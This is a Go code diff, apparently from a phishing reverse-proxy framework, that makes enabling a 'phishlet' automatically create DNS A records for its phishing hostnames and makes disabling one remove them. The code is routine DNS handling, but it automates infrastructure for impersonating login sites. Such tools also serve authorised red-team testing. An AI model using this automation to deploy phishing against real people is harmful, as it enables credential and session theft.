@@ -308,7 +308,8 @@ func (s *PhishletService) InvalidateLures() {
 
 // Enable marks a phishlet as active, optionally updating its hostname, base
 // domain, and DNS provider. The resolver is updated atomically so routing
-// takes effect immediately without a restart.
+// takes effect immediately without a restart. If a DNS reconciler is configured,
+// A records are created for each proxy host's phishing FQDN.
 func (s *PhishletService) Enable(name, hostname, dnsProvider string) (*Phishlet, error) {
 	p := s.currentOrNew(name)
 	if hostname != "" {
@@ -329,6 +330,9 @@ func (s *PhishletService) Enable(name, hostname, dnsProvider string) (*Phishlet,
 	p.Enabled = true
 	if err := s.store.SetPhishlet(p); err != nil {
 		return nil, err
+	}
+	if err := s.dns.Reconcile(context.Background(), phishletRecords(p)); err != nil {
+		return nil, fmt.Errorf("dns reconcile: %w", err)
 	}
 	s.resolver.register(p)
 	s.bus.Publish(Event{Type: EventPhishletEnabled, Payload: p})
@@ -351,11 +355,16 @@ func deriveBaseDomain(def *Phishlet, hostname string) string {
 	return ""
 }
 
-// Disable marks a phishlet as inactive.
+// Disable marks a phishlet as inactive and removes its DNS records.
 func (s *PhishletService) Disable(name string) (*Phishlet, error) {
 	p, err := s.currentOrErr(name)
 	if err != nil {
 		return nil, err
+	}
+	if p.Enabled {
+		if err := s.dns.RemoveRecords(context.Background(), phishletRecords(p)); err != nil {
+			return nil, fmt.Errorf("dns cleanup: %w", err)
+		}
 	}
 	p.Enabled = false
 	if err := s.store.SetPhishlet(p); err != nil {
@@ -429,4 +438,17 @@ func (s *PhishletService) currentOrErr(name string) (*Phishlet, error) {
 		return &copy, nil
 	}
 	return s.store.GetPhishlet(name)
+}
+
+// phishletRecords builds the DNS A records needed for a phishlet's proxy hosts.
+// Each proxy host's phishing FQDN needs an A record in the base domain zone.
+func phishletRecords(p *Phishlet) []PhishletRecord {
+	records := make([]PhishletRecord, 0, len(p.ProxyHosts))
+	for _, ph := range p.ProxyHosts {
+		records = append(records, PhishletRecord{
+			Zone: p.BaseDomain,
+			Name: ph.PhishHost(p.BaseDomain),
+		})
+	}
+	return records
 }
